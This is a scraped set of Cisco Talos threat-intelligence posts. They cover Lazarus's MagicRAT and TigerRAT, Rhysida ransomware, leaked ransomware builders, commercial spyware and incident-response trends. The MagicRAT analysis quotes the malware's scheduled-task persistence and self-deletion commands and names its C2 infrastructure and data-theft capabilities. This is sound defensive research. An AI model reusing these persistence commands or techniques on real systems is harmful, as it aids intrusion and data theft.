Talos Intelligence Blog 1,https://blog.talosintelligence.com/lazarus-magicrat/,"Cisco Talos has discovered a new remote access trojan (RAT) we're calling ""MagicRAT,"" developed and operated by the Lazarus APT group, which the U.S. government believes is a North Korean state-sponsored actor.

Lazarus deployed MagicRAT after the successful exploitation of vulnerabilities in VMWare Horizon platforms.

We've also found links between MagicRAT and another RAT known as ""TigerRAT,"" disclosed and attributed to Lazarus by the Korean Internet & Security Agency (KISA) recently.

TigerRAT has evolved over the past year to include new functionalities that we illustrate in this blog.

Executive Summary



Cisco Talos has discovered a new remote access trojan (RAT), which we are calling ""MagicRAT,"" that we are attributing with moderate to high confidence to the Lazarus threat actor, a state-sponsored APT attributed to North Korea by the U.S. Cyber Security & Infrastructure Agency (CISA). This new RAT was found on victims that had been initially compromised through the exploitation of publicly exposed VMware Horizon platforms. While being a relatively simple RAT capability-wise, it was built with recourse to the Qt Framework, with the sole intent of making human analysis harder, and automated detection through machine learning and heuristics less likely.



We have also found evidence to suggest that once MagicRAT is deployed on infected systems, it launches additional payloads such as custom-built port scanners. Additionally, we've found that MagicRAT's C2 infrastructure was also used to host newer variants of known Lazarus implants such as TigerRAT.



The discovery of MagicRAT in the wild is an indication of Lazarus' motivations to rapidly build new, bespoke malware to use along with their previously known malware such as TigerRAT to target organizations worldwide.



Actor profile

Attribution



Cisco Talos assesses with moderate to high confidence these attacks have been conducted by the North Korean state-sponsored threat actor Lazarus Group. This attribution is based on tactics, techniques and procedures (TTPs), malware implants and infrastructure overlap with known Lazarus campaigns.

We have observed overlaps in C2 servers serving MagicRAT and previously disclosed Lazarus campaigns utilizing the Dtrack RAT family. Furthermore, Talos has also discovered C2 servers hosting and serving TigerRAT to existing MagicRAT infections. TigerRAT is a malware family attributed to the Lazarus APT groups by the Korean Internet & Security Agency (KISA).



In some infections, we observed the deployment of MagicRAT by the attackers for some time, followed by its removal and the subsequent download and execution of another custom-developed malware called ""VSingle,"" another implant disclosed and attributed to Lazarus by JPCERT.

Technical analysis



MagicRATMagicRAT is programmed in C++ programming language and uses the Qt Framework by statically linking it to the RAT on 32- and 64-bit versions. The Qt Framework is a programming library for developing graphical user interfaces, of which this RAT has none. Talos believes that the objective was to increase the complexity of the code, thus making human analysis harder. On the other hand, since there are very few examples (if any) of malware programmed with Qt Framework, this also makes machine learning and heuristic analysis detection less reliable.



The 32-bit version was compiled with GCC v3.4 using mingw/cygwin for support on the Microsoft Windows platform, the 64-bit version, however, was compiled with VisualC64, version 7.14.



The RAT uses the Qt classes throughout its entire code. The configuration is dynamically stored in a QSettings class eventually being saved to disk, a typical functionality provided by that class.



The malware configuration (containing author-defined QSettings) is stored in the file ""visual.1991-06.com.microsoft_sd.kit"" in the path ""\ProgramData\WindowsSoftwareToolkit""- names and paths obviously chosen to trick the victim into believing they were part of the operating system.



The image below shows an example of a configuration file. During our analysis, we identified three sections in the configuration file:

[os] which contains the command and control (C2) URLs.

which contains the command and control (C2) URLs. [General] which holds general information.

which holds general information. [company] which holds data used in the communication with the C2.



All analyzed samples had three encoded C2 URLs that are used to register infections and then receive commands to execute on the infected endpoint. The URLs are stored in the configuration file with the keys ""windows"", ""linux"" and ""mac."" The values are prefixed with ""LR02DPt22R"" followed by the URL encoded in base64.



Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded command that creates scheduled tasks on the victim machine.

Command Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr ""C:\Windows\System32\cmd.exe /c del /f /q C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru SYSTEM Scheduled task starting at a specific time [T1053/005] schtasks /create /tn ""Microsoft\Windows\light Service Manager"" /tr C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM Scheduled task starting at a different time an path [T1053/005] %HOME%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/OneNote.lnk Link created on startup folder [T1547/001]



Upon achieving persistence, the RAT contacts the C2.







During the initial stages of execution, MagicRAT will perform just enough system reconnaissance to identify the system and environment in which the attackers are operating. This is done by executing the commands whoami, systeminfo and ipconfig /all. The last command has its results returned via the upload of the file zero_dump.mix to the C2.



MagicRAT is rather simple — it provides the operator with a remote shell on the victim's system for arbitrary command execution, along with the ability to rename, move and delete files on the endpoint. The operator can determine the timing for the implant to sleep, change the C2 URLs and delete the implant from the infected system.



We also discovered a new variant of MagicRAT in the wild generated in April 2022. This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.











Additional malware



One of the C2 servers used by the new MagicRAT sample, 64[.]188[.]27[.]73, hosted two more distinct implants masquerading as GIF URLs. Now, MagicRAT can make requests to its C2 and download a GIF file, which is actually an executable.

Lightweight port scanner

One of the GIF files discovered on the MagicRAT C2 is called ""pct.gif,"" which is an extremely simple port scanner, whose main code fits into the image below.

It takes three arguments: The IP to connect to, followed by the port number and, finally, a value dictating whether the output of the port scan must be written to a log file on disk or the standard output. After a successful connection, the executable will either write the string ""Connection success!"" to the standard output or to a log file called ""Ahnupdate.log"" located in the current user's temporary directory.

TigerRAT

The second implant hosted on MagicRAT's C2 is a remote access trojan (RAT) known as TigerRAT. TigerRAT is an implant disclosed in 2021 by KISA and KRCERT as part of ""Operation ByteTiger'' detailing TigerRAT and its downloader ""TigerDownloader.""



This implant consists of several RAT capabilities, ranging from arbitrary command execution to file management. Capabilities of the implant include:

Gather system information: username, computer name, network interface info, system info including product and version.

Run arbitrary commands on the endpoint: set/get CWD, run command via cmd.exe



Implant capability to run arbitrary commands.



Screen capture.

Socks tunneling.

Keylogging.

File Management: drive reconnaissance, enumerate/delete files, create and write to files, read files and upload contents to C2, create processes,

Self delete/uninstall from system.The latest TigerRAT versions included one new capability with indicators of a second capability set to be introduced soon. One of these capabilities is called ""USB dump."" The authors have also created skeleton code in preparation for implementing video capture from Web cameras, though it hasn't been implemented yet.

USB Dump



The USB Dump capability gives the attackers the ability to:

Enumerate files for path ""LOCAL_APPDATA\GDIFONTC"".

Delete files.

Find files of specific extensions in a specified drive and folder: .docx, .hwp, .doc, .txt, .pdf, .zip, .zoo, .arc, .lzh, .arj, .gz, .tgz. Add these files to an existing archive - in preparation for exfiltration. This is the main functionality of this new capability.





The image below shows the code used to check the file extensions.



Lazarus' implants commonly stitch together functionalities, including occasionally removing and adding different functions, which is evident from the latest TigerRAT samples:



While Lazarus added a new capability (USB dumping and skeleton code for Webcam capture) they removed the port forwarding capability in the latest version. Older variants of TigerRAT (seen in 2020-2021) consisted of encrypted strings but the latest variant consists of strings in plaintext.

Talos Intelligence Blog 2,https://blog.talosintelligence.com/vulnerability-roundup-august-9-23/,"Cisco Talos recently worked with two vendors to patch multiple vulnerabilities in a favored software library used in chemistry laboratories and the Foxit PDF Reader, one of the most popular PDF reader alternatives to Adobe Acrobat.

Attackers could exploit these vulnerabilities to carry out a variety of attacks, in some cases gaining the ability to execute remote code on the targeted machine.

Seven of the vulnerabilities included in today’s Vulnerability Roundup have a CVSS severity score of 9.8 out of a possible 10.

For Snort coverage that can detect the exploitation of these vulnerabilities, download the latest rule sets from Snort.org, and our latest Vulnerability Advisories are always posted on Talos Intelligence’s website.

Multiple vulnerabilities in Open Babel software

Talos researchers recently discovered multiple vulnerabilities in Open Babel, an open-source software library used in a variety of chemistry and research settings.

Open Babel allows users to “search, convert, analyze, or store data from molecular modeling, chemistry, solid-state materials, biochemistry, or related areas,” according to its website, and is used in other popular pieces of software in the science field. Therefore, there are cases where these vulnerabilities are accessible via the internet.

The vulnerabilities Talos disclosed to the operators of Open Babel can all be triggered by tricking a user into opening a specially crafted, malformed file. Depending on the platform and on how the code is compiled, these vulnerabilities could lead to arbitrary code execution:

Talos is disclosing these vulnerabilities despite no official fix from Open Babel. The vendor declined to release an update within the 90-day period as outlined in Cisco’s vulnerability disclosure policy.

Several issues in Foxit PDF reader could lead to arbitrary code execution

Foxit PDF Reader is one of the most popular PDF readers on the market, offering many similar features to Adobe Acrobat. The software also includes a browser extension that allows users to read PDFs right in their web browsers.

Talos discovered multiple vulnerabilities in Foxit PDF Reader that could allow an adversary to execute , arbitrary code on the targeted machine. An attacker could exploit these issues by tricking a user into opening a specially crafted PDF document or, if the user has the browser extension enabled, by visiting a malicious web page:"
Talos Intelligence Blog 3,https://blog.talosintelligence.com/rhysida-ransomware/,"Cisco Talos is aware of the recent advisory published by the U.S. Department of Health and Human Services (HHS) warning the healthcare industry about Rhysida ransomware activity.

As we've discussed recently, there has been huge growth in the ransomware and extortion space, potentially linked to the plethora of leaked builders and source code related to various ransomware cartels. This is just another example of how these groups can now quickly develop their own ransomware variants by standing on the shoulders of those criminals who had their previous work exposed publicly. Rhysida appears to have first popped up back in May, with several high-profile compromises posted on their leak site.

Rhysida ransomware details

As we commonly see in the ransomware space, this threat is delivered through a variety of mechanisms which can include phishing and being dropped as secondary payloads from command and control (C2) frameworks like Cobalt Strike. These frameworks are commonly delivered as part of traditional commodity malware, so infection chains can vary widely.

The group itself likes to pretend to be a cybersecurity organization as shown in the ransom note below. They claim to have compromised the company and are willing to help resolve the issue. These types of approaches are not uncommon — historically, groups have done things like provide ""security reports"" to compromised organizations to help them ""resolve the issue.""

Sample ransom note.

The group appears to commonly deploy double extortion — of the victims that have been listed on the leak site, several of them have had some portion of their exfiltrated data exposed.

Encryption algorithm

Rhysida’s encryption algorithm is relatively straightforward and uses the ChaCha20 encryption algorithm. We have seen this algorithm deployed by other groups before, either as a standalone encryption algorithm or as part of a more custom approach. Rhysida will enumerate through directories and files in directories starting from “A:” to “Z:” drives, ensure they’re missing from the “exclude list” and then “process,” i.e., encrypt the files. Once encrypted, the file is then renamed to “<filename>.rhysida”.

Rhysida’s algorithm for “processing” files.

The file exclusion list maintained in Rhysida samples is most of the usual system directories required for the operating system to function:

Excluded folders.

Excluded extensions include:

.bat .bin .cab .cmd .com .cur .diagcab .diagcfg, .diagpkg .drv .dll .exe .hlp .hta .ico .lnk .msi .ocx .ps1 .psm1 .scr .sys .ini Thumbs.db .url .iso .cab

After encryption, the ransomware will display the ransom note by creating and opening it as a PDF and the background wallpaper. The PDF usually named “CriticalBreachDetected.pdf” is generated using content embedded in the ransomware binary, including the skeleton PDF and the ransom note (shown above). The ransom note is also used to generate a message in the form of the background wallpaper typically located at “C:/Users/Public/bg.jpg”.

This new ransomware variant doesn't have any novel features or functionality and points to the challenges organizations are facing as the landscape continues to shift and a plethora of new actors join their ranks. This isn't even the only new ransomware group we've written about this week.

Talos Intelligence Blog 4,https://blog.talosintelligence.com/code-leaks-new-ransomware-actors/,"Ransomware gangs are consistently rebranding or merging with other groups, as highlighted in our 2022 Year in Review, or these actors work for multiple ransomware-as-a-service (RaaS) outfits at a time, and new groups are always emerging.

This trend is already continuing this year. Since 2021, there have been multiple leaks of ransomware source code and builders — components that are essential to creating and modifying ransomware. This has had a significant effect on the threat landscape, giving unsophisticated actors the ability to easily generate their own ransomware with little effort or knowledge. As more actors enter this space, Cisco Talos is seeing an increasing number of ransomware variants emerge, leading to more frequent attacks and new challenges for cybersecurity professionals, particularly regarding actor attribution.

Code leaks are benefitting threat actors

Since September 2021, we have seen actors publicly disclosing source code and builders for prominent ransomware families, including Babuk, Conti, LockBit 3.0 and Chaos. In some cases, such as LockBit 3.0’s ransomware builder, these leaks have been intentional, with affiliates posting these tools and codes to protest against broader group policies they are unhappy with. In other instances, such as the Babuk source code, the leaks were seemingly an operational error. Regardless of the cause, these leaks are having a significant effect on the threat landscape, making it easier for novice or unskilled actors to develop their own ransomware variants without much effort or knowledge.

Ransomware source code is a malicious program that contains the instructions and algorithms that define the ransomware’s behavior. It is usually complex and often requires skilled technicians to create. Therefore, having access to such code allows threat actors with minimum programming knowledge to modify and compile their own ransomware variants.

Ransomware builders usually have a user interface that allows users to choose the underlying features and customize the configurations to build a new ransomware binary executable without exposing the source code or needing a compiler installed. The availability of such builders allows novice actors to generate their own customized ransomware variants. An example of a leaked Chaos ransomware builder V5 is shown in the picture below.

When ransomware source code or builders are leaked, it becomes easier for aspiring cybercriminals who lack the technical expertise to develop their own ransomware variants by making only minor modifications to the original code. Additionally, by using leaked source code, threat actors can confuse or mislead investigators, as security professionals may be more likely to misattribute the activity to the wrong actor.

New variants based on leaked code are becoming more common

We have continued seeing various malicious campaigns since the start of 2023, where the threat actors have used new ransomware variants based on leaked source code or builders. Early this year, Talos discovered a new ransomware family called MortalKombat generated by the leaked Xorist ransomware builder. Xorist ransomware, which operates under the RaaS model, has a builder called “Encoder Builder v.24” that is available on underground forums. Based on our research, we discovered an unknown threat actor using MortalKombat ransomware since December 2022 to target individuals and smaller companies. This campaign has a multi-stage attack chain that begins with a phishing email delivered to victims impersonating CoinPayments, a legitimate global cryptocurrency payment gateway.

In April, Talos discovered a new ransomware actor, RA Group, conducting double extortion attacks using their ransomware variant based on leaked Babuk source code. Babuk, a Russian ransomware group that emerged in 2021, has conducted a series of high-profile ransomware attacks across various industries, including government, healthcare, logistics, and professional services. Since an alleged member of the Babuk group leaked the full source code of its ransomware in September 2021, several new variants based on the leaked code have emerged, with many appearing in 2023, including ESXiArgs, Rorschach and RTM Locker, in addition to RA Group. RA Group, in its ongoing campaigns, has targeted the U.S., South Korea, Taiwan, the U.K. and India across several business verticals, including manufacturing, wealth management, insurance providers, pharmaceuticals and financial management consulting companies.

Most recently, Talos observed a surge in new ransomware strains emerging from the Yashma ransomware builder. Yashma ransomware builder, which first appeared in May 2022, is a rebranded version of the Chaos ransomware builder V5, which was leaked in April 2022. Since early 2023, we have seen several new Yashma strains emerge, including ANXZ, Sirattacker, and Shadow Men Team. Shadow Men Team — whose name we derived from a translation of their Hindi name in the ransom note — appears to be a new actor in the ransomware space. The actors appear to target victims in Kuwait, as the ransom note demands payment in Kuwaiti dinar before translating that sum to its U.S. dollar equivalent in Bitcoin.

Another new actor we discovered, seemingly of Vietnamese origin, uses a Yashma ransomware variant to target victims in Bulgaria, China, Vietnam and other countries. The campaign started in at least June 2023, and the ransom note appears to mimic certain aspects of the ransom note used in the global WannaCry attacks from 2017.

Actors repurposing leaked code are demanding low ransom payments



Cybercriminals leveraging leaked code and builders are seemingly more conservative in their ransom demands, a possible indication that they are lone wolf operators, proceeding cautiously as they test their new variants or are new players in this space. Actors behind many of these new ransomware variants, including Sirattacker, Chaos 2.0, Chaos 4.0, DCrypt, and Shadow Men Team, are demanding payments ranging from USD $3.50 to $4,390 in Bitcoin from victims. These ransom demands are significantly lower than those made by many well-known ransomware gangs like RYUK, Babuk, REvil, Conti, DarkSide, BlackMatter, BlackCat, and Yanluowang, which are typically in the millions of dollars. These more profitable groups usually operate under the RaaS model, meaning their affiliates are free to set their own (often high) ransom demands, and/or are structured so they pay their operators and developers, thereby driving up the amount of money they seek to take in during the course of their operations.

Below is a comparison of ransom demands made by actors using leaked code or builders and well-known ransomware gangs.

Opportunities for security researchers and defenders

While these changes in the threat landscape have largely benefitted threat actors, security researchers and defenders also have an advantage with access to the leaked code. It allows security researchers to analyze the source code and understand the attacker’s tactics, techniques and procedures (TTPs), which helps security professionals develop effective detection rules and enhance security products' capabilities in combating ransomware threats.

By analyzing the source code, researchers can identify similar patterns and techniques used by different threat actors, providing defenders with a way to proactively detect and block the new variants at the initial stage of an attack. Security researchers can also share the intelligence information derived from the leaked code with the broader security community, thereby contributing to strengthening the cybersecurity space. By understanding the TTPs of the leaked source codes, defenders will gain invaluable insights that are helpful in identifying and mitigating any existing security weakness in their environment and improving their security defense against these attack vectors."
Talos Intelligence Blog 5,https://blog.talosintelligence.com/what-is-commercial-spyware/,"We’ve talked quite a bit about spyware recently, with very good reason. Recently, concerns have grown regarding the rapid growth of commercial spyware tools, and the way in which they are being used against their intended victims.

This Need to Know article talk about the broader effects of spyware becoming more commercialized, how it is being used, and the differences between commercial spyware and digital extortion.

What is commercial spyware, and why is it a growing trend?

In general terms, spyware is software that can be installed on a device and used to monitor activity and/or capture potentially sensitive data. The term has been around since the 1990s, and the first spyware to be identified was developed by criminals to steal passwords or financial information from devices. Spyware can even be used to track the device's physical location and record from the camera or microphone.

The opportunities for governments and law enforcement to use spyware as part of legal investigations led to the development of commercial spyware. Attackers have long used commercial products developed by legitimate companies to compromise targeted devices.

These products are known as commercial spyware. Commercial spyware operations mainly target mobile platforms with zero- or one-click zero-day exploits to deliver spyware.

Commercial spyware can be seen as having legitimate reasons to exist, especially in instances of crime and terrorism (as long as it is highly regulated). The problem is that there isn’t a universal or global way in which these companies are being regulated.

As such, we’ve seen a growing number of reports of victims who are targeted with commercial spyware. These victims are not criminals or terrorists, but instead, they are associated with activism. For example, there have been reports of journalists who report on human rights abuses, and activists shining a light on oppressive regimes, who have been targeted and compromised with this tooling.

Problems also arise when organizations turn a blind eye to the usage of commercial spyware.

A recent report from the United Kingdom’s National CyberSecurity Center (NCSC) highlights how the accessibility of these tools “lowers the barrier to entry to state and non-state actors in obtaining capability and intelligence.” The United States government also threatened to step in when it looked like a U.S. company was going to purchase NSO Group, an infamous Israeli maker of the Pegasus spyware.

What ways can you protect yourself if you might be a target of commercial spyware?

As the victims of commercial spyware are highly targeted individuals, the sobering truth is that some attackers have the means to be able to spend six figures to compromise a single target. It is therefore likely that they will try many things to compromise your mobile phone, including using zero-day attacks or unknown vulnerabilities.

That is very concerning to us, however, there are a couple of things that end users can look out for:

Although zero-click exploits do exist, they're not very common. Most of the time, unsolicited messages from various people are the first entry point. So, if you get a bunch of messages from strangers, don't click on the links, and don’t click on any attachments.

Additionally, something as simple as rebooting your phone can help clear the spyware from your device. This is because commercial spyware companies typically do not build persistence into their spyware.

If you are talking to someone who may be a target of commercial spyware (i.e., human rights journalists, activists, dissidents and lawyers) it’s a good idea to reboot your phone before you talk to them. It is entirely possible that these threat actors will go as far as compromising close contacts of their targets.

Notable example of commercial spyware

Talos provided a highly informative article on the PREDATOR commercial spyware, which has been around since 2019.

PREDATOR is intended to work with another spyware component called “ALIEN” (it’s not “Alien vs. Predator” this time; they’re working together). They work to bypass traditional security barriers on the Android operating system and provide a variety of information stealing, surveillance and remote access capabilities.

The differences between commercial spyware and digital extortion attacks

You may have received an email something like, “We know you’ve visited this adult website. We filmed you watching some videos. Now we’re going to send all your friends and family that footage unless you pay us in bitcoins.”

These are typically digital extortion attacks, not actual spyware. Attackers send these emails to multiple accounts, hoping that someone will believe the story, and pay up.

As we’ve talked about, commercial spyware is highly targeted. The customers of these commercial spyware organizations know who their victim(s) are. In digital extortion attacks, cyber criminals generally don’t know who their victims are, but they’re hoping as many people as possible believe the story, and pay up.

They will usually have found your email address via a data breach of a third party. If you receive such an email, just delete it and don’t give it a second thought. The email you received will be one of many thousands.

What is Cisco doing to take action against the growth of commercial spyware?

Cisco, Microsoft, and other tech companies have joined in supporting Meta's lawsuit against the NSO Group referenced above through court filings. Cisco was also a key drafter of the Cyber Mercenary Principles document adopted by the Cyber Tech Accord. The document acknowledges the threat realized by these commercial offerings and outlines the steps that organizations are taking to help limit the impacts of commercial spyware.

Talos Intelligence Blog 6,https://blog.talosintelligence.com/talos-ir-q2-2023-quarterly-recap/,"Cisco Talos Incident Response (Talos IR) responded to a growing number of data theft extortion incidents that did not involve encrypting files or deploying ransomware, a 25 percent increase since last quarter and the most-observed threat in the second quarter of 2023.

In this type of attack, threat actors steal victim data and threaten to leak or sell it unless the victim pays varying sums of money, eliminating the need to deploy ransomware or encrypt data. This differs from the double-extortion ransomware method, whereby adversaries exfiltrate and encrypt files and demand payment for victims to receive a decryption key.

Ransomware was the second most-observed threat this quarter, accounting for 17 percent of engagements, a slight increase from last quarter’s 10 percent. This quarter featured the LockBit and Royal ransomware families, which Talos IR has observed in previous quarters. Talos IR also observed several ransomware families for the first time, including 8Base and MoneyMessage.

Compromised credentials or valid accounts were the top observed means of gaining initial access this quarter, accounting for nearly 40 percent of total engagements. It was challenging to identify how the credentials were compromised considering they were obtained from devices outside the company’s visibility, such as saved credentials on an employee’s personal device.

Continuing the trend from last quarter, healthcare was the most targeted vertical this quarter, making up 22 percent of the total number of incident response engagements, closely followed by financial services.

Data theft extortion on the rise, featuring Clop, Karakurt and RansomHouse

Data theft extortion was the top observed threat this quarter, accounting for 30 percent of threats Talos IR responded to, a 25 percent increase in data theft extortion incidents compared to last quarter. The rise in data theft extortion incidents compared to previous quarters is consistent with public reporting on a growing number of ransomware groups stealing data and extorting victims without encrypting files and deploying ransomware.

Data theft extortion is not a new phenomenon, but the number of incidents this quarter suggests that financially motivated threat actors are increasingly seeing this as a viable means of receiving a final payout. Carrying out ransomware attacks is likely becoming more challenging due to global law enforcement and industry disruption efforts, as well as the implementation of defenses such as increased behavioral detection capabilities and endpoint detection and response (EDR) solutions.

This quarter featured activity from the RansomHouse and Karakurt extortion groups for the first time in Talos IR engagements. Active since 2021, Karakurt typically gains access to environments via valid accounts, phishing, or exploiting vulnerabilities. In one observed Karakurt data theft extortion engagement, the attackers hijacked a remote desktop protocol (RDP) account, enumerated domain trusts using the network administration command-line tool nltest, executed PowerShell scripts to recover passwords, and modified domain policies.

RansomHouse has been active since late 2021 and is known for gaining access to corporate environments by exploiting vulnerabilities. In a RansomHouse engagement, the adversaries used non-interactive sessions to bypass multi-factor authentication (MFA), carried out a DCSync attack to collect credentials from a domain controller, and abused remote services such as secure shell (SSH) and RDP to move laterally. A DCSync attack occurs when attackers use various commands in Microsoft Directory Replication Service (DRS) Remote Protocol to masquerade as a domain controller to acquire user credentials from another domain controller. An attacker first needs to compromise a user account with domain replication privileges, which are typically domain admins.

Some ransomware groups, such as BianLian and Clop, are reportedly shifting away from using encryption, favoring data theft extortion in recent attacks, according to public reporting. Although Talos IR did not respond to any BianLian incidents this quarter, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) published a joint advisory on May 16 with the FBI and the Australian Cyber Security Centre (ACSC) confirming that as of January, the BianLian group stopped conducting ransomware operations in favor of performing exfiltration-based data theft extortion. BianLian group’s shift from deploying ransomware may also be due to the release of a free decrypter for BianLian ransomware in January 2023, possibly prompting them to pursue alternate methods. It is possible BianLian determined they could be successful without the use of data encryption in their operations.

Active since February 2019, the Clop group started as a ransomware-as-a-service (RaaS) operation with an affiliate program that relied on the double extortion technique involving stealing and encrypting data. With the rise in data theft extortion incidents this quarter, it is possible the trend will continue, with other groups who primarily deploy ransomware shifting to data theft extortion as a primary means of receiving a payout.

In a Clop data theft extortion engagement this quarter, the adversaries gained initial access by exploiting a zero-day remote code execution (RCE) vulnerability in the Forta GoAnywhere managed file transfer (MFT) application, tracked as CVE-2023-0669. Notably, the affiliate did not deploy ransomware and only conducted data theft extortion upon exfiltrating victim information. The Clop ransomware group has a history of mass exploitation of zero-day vulnerabilities in campaigns targeting file transfer applications, affecting hundreds of companies globally. This includes several zero-day vulnerabilities in the Kiteworks, formerly Accellion, file transfer application (FTA), tracked as CVE-2021-27101, CVE-2021-27102, CVE-2021-207103, and CVE-2021-27104, and a SQL injection vulnerability in the Progress Software’s MFT application known as MOVEit Transfer, tracked as CVE-2023-34362. U.S. law enforcement has taken notice and increased pressure on the group, offering a $10 million dollar reward for information on the identification or location of Clop members.

It is highly unusual for a ransomware group to consistently exploit zero-day vulnerabilities, given the resources required to develop such exploits, possibly suggesting that the Clop ransomware group possesses a level of sophistication and funding matched only by advanced persistent threats (APTs). Given the group’s incorporation of zero-days in MFT applications in recent attacks, and the group’s perceived success in affecting hundreds of organizations, Clop is likely to target MFT applications in the future.

Ransomware

Ransomware accounted for 17 percent of the total number of engagements responded to in Q2 2023 (April - June), a slight increase compared to 10 percent last quarter. 8Base and MoneyMessage ransomware operations were observed for the first time this quarter, in addition to the previously seen ransomware operations LockBit and Royal.

First discovered in March 2022, 8Base is a ransomware group/operation that uses a customized version of Phobos ransomware and steals data prior to encryption. Although the group has been around for over a year, it started gaining increasing popularity in June 2023 after a significant spike in activity.

In an 8Base ransomware engagement, the legitimate remote desktop application AnyDesk was installed in the Performance Logs (Perflogs) directory, potentially as a way to evade detection. The Perflogs folder is a system-generated folder that stores information about the performance of the device. The attackers were also observed dumping credentials from the Local Security Authority Subsystem Service (LSASS) memory, creating new processes with an existing user token to bypass access controls, escalating privileges using the runas command, and using the Windows command shell to execute PowerShell scripts.

MoneyMessage is a fairly new ransomware operation that was first discovered in March 2023. Similar to 8Base, the MoneyMessage ransomware group operates under the double-extortion model. MoneyMessage is a ransomware family written in the C++ programming language and uses the Elliptic Curve Diffie-Hellman (ECDH) key exchange and ChaCha stream cipher algorithm for encryption, both of which are commonly used by ransomware families.

Talos IR responded to a MoneyMessage ransomware attack where the MoneyMessage encryptor was dropped in the Netlogon directory allowing for the deployment of the ransomware to multiple hosts. Prior to executing ransomware, the attackers also uninstalled various security tools, such as EDR solutions, via PowerShell scripts to impair defenses.

Initial vectors

In the majority of the engagements Talos IR responded to this quarter, adversaries gained initial access by abusing compromised credentials to access valid accounts. The use of valid accounts was observed in nearly 40 percent of the total engagements, a 22 percent increase from Q1 2023.

It is difficult to say how adversaries obtained the compromised credentials used to access valid accounts. There are a number of ways credentials can become compromised, such as third-party data breaches, information-stealing malware such as Redline, and phishing campaigns. This is especially true if employees reuse credentials across multiple accounts, highlighting the importance of using strong password policies and enabling MFA across critical servers.

Security weaknesses

A lack of MFA or improper MFA implementation across critical services played a part in over 40 percent of the engagements Talos IR responded to this quarter. Talos IR frequently observes attacks that could have been prevented if MFA was enabled on critical services, such as VPNs. In nearly 40 percent of engagements, attackers were able to abuse compromised credentials to access valid accounts, 90 percent of which did not have MFA enabled. In some engagements, adversaries were able to bypass MFA with MFA exhaustion/fatigue attacks.

MFA exhaustion attacks occur when an attacker attempts to repeatedly authenticate to a user account with valid credentials to overwhelm victims with MFA push notifications, hoping they will eventually accept, allowing the attacker to successfully authenticate into the account. Identification and user education are key parts of countering MFA bypass techniques. Organizations should ensure employees are aware of who to contact in these situations to determine if the event was a technical issue or malicious in nature.

Talos IR recommends disabling VPN access for all accounts that do not have MFA enabled. Additionally, Talos IR recommends expanding MFA for all user accounts (e.g., employees, contractors, business partners, etc.). Talos IR has repeatedly seen attackers targeting vendor and contractor accounts (VCAs), which typically have expanded privileges and access. VCAs are often overlooked during account audits due to trust placed in the third party, making them an easy target for attackers. Talos IR recommends disabling VCAs when they are not needed, implementing least privilege access, and validating that logging and security monitoring are enabled for VCA accounts.

Talos IR also recommends organizations perform a password audit across all user and service accounts to ensure complexity and strength are aligned with the industry best practices per account type (e.g., privilege, service, user, etc.) to prevent password enumeration techniques, such as password spraying.

Top-observed MITRE ATT&CK techniques

The table below represents the MITRE ATT&CK techniques observed in this quarter’s IR engagements, which includes relevant examples and the amount Talos IR saw in engagements. Given that some techniques can fall under multiple tactics, we grouped them under the most relevant tactic in which they were leveraged. Please note this is not an exhaustive list.

Key findings from the MITRE ATT&CK framework include:

The use of valid accounts was the top observed initial access technique, accounting for nearly 40 percent of the total number of engagements.

Observed in over 50 percent of engagements this quarter, PowerShell is a dynamic command line utility that continues to be a popular utility of choice for adversaries likely for a number of reasons including stealth, convenience and vast IT administration capabilities.

In 26 percent of engagements this quarter, Talos IR observed attackers abusing remote services, such as RDP and SSH, to facilitate lateral movement.

The top persistence mechanism observed this quarter was the abuse of Windows Task Scheduler to create scheduled tasks, allowing adversaries to execute programs or commands at scheduled times or at system startup."
Talos Intelligence Blog 7,https://blog.talosintelligence.com/threat-source-newsletter-july-20-2023/,"Welcome to this week’s edition of the Threat Source newsletter.

Last week, the Biden administration released its formal roadmap for its national cybersecurity initiative meant to encourage greater investment in cybersecurity and strengthen the U.S.’s critical infrastructure security (and more).

The roadmap goes a long way toward actualizing a plan the administration released earlier this year and sets tangible goals and programs to put many of these initiatives into action. But because nothing ever moves quickly in government, this roadmap and the associated plan are already hitting a few roadblocks.

First, there’s the ever-present partisan politics. Republican state lawmakers are backing a legal challenge in the court systems to block an Environmental Protection Administration rule that asked local water systems to evaluate their current cybersecurity systems and protections while conducting sanitation surveys. To me, simply asking critical infrastructure to consider these factors as part of their normal processes seems like a non-issue, but the U.S. Appeals Court has put a hold on this rule for the time being (though it didn’t give a precise reason at the time of its ruling).

If lawmakers are going to hash these types of regulations in court every time something new pops up, we’ll never reach the point of these rules actually being implemented.

Two leading Republican members of the U.S. House came out hours after the Biden administration released the roadmap, saying they would use their respective House panels to, “exercise strict oversight on CISA’s efforts” to implement many of the policies outlined.

Regardless of which side of the political spectrum you fall, cybersecurity should be something our lawmakers can all agree on.

Say these arguments extend through the 2024 election — what happens if control of the White House or Congress switches between parties? And then that changes again in 2026? Change is slow, so none of these initiatives are going to be implemented overnight.

If our government can’t come to any sort of agreement about the importance of cybersecurity, and how to encourage stronger public-private partnerships to reach the country’s goals, this is just going to be another partisan issue that’s held up by legal challenges, budget negotiations, hearings and verbal discourse. And by the time that all subsides, the people in charge of outlining and implementing these cybersecurity goals could have very well changed.

So, forgive me if I’m coming off as a bit skeptical that anything in this roadmap will end up passing any mile markers.

The one big thing

Our researchers recently discovered a threat actor conducting several campaigns against government entities, military organizations and civilian users in Ukraine and Poland. Our recent reporting states that these operations are very likely aimed at stealing information and gaining persistent remote access. The activity we analyzed occurred as early as April 2022 and as recently as earlier this month, demonstrating the persistent nature of the threat actor. The final payloads include the AgentTesla remote access trojan (RAT), Cobalt Strike beacons and njRAT.

Why do I care?

If you’re a user in Ukraine or Poland, especially someone working in the government or military sectors, this is a clear-cut example of a spam campaign targeting this population. For those who fall outside of that demographic, it’s interesting that this group is still relying on the user enabling macros in Office, since Microsoft disabled those by default earlier this year. These are also highly targeted emails with (relatively speaking) convincing lures, so whoever is behind these is not to be ignored.

So now what?

There are multiple Cisco Secure protections in place to defend against the types of spam used in these campaigns. Other Snort rules and detection content can prevent the execution of the malware used as the final payload. Our researchers have also published examples of the types of lure images and documents used in the initial phishing emails so users can know what to be on the lookout for.

Top security headlines of the week

